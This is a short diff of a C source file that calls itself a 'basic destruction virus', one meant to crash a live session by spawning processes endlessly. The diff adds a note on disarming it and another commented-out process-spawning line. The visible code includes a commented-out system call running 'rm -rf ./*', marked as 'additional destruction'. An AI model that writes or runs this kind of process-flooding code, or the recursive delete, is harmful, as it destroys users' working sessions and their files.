@@ -3,6 +3,7 @@
 // filename: bullshit.c
 // file description: [source code] basic destruction virus 
 // destroys a live session by spam-spawning processes
+// disarm instructions: simply close terminal window
 
 int main() {
 
@@ -13,5 +14,6 @@ int main() {
 		//system("gedit&");	     // other ideas
 		//system("rm -rf ./* && cd .."); // additional destruction, even more with overwrite
 		//system("nemo&");
+		//system("nautilus&");
 	}
 }
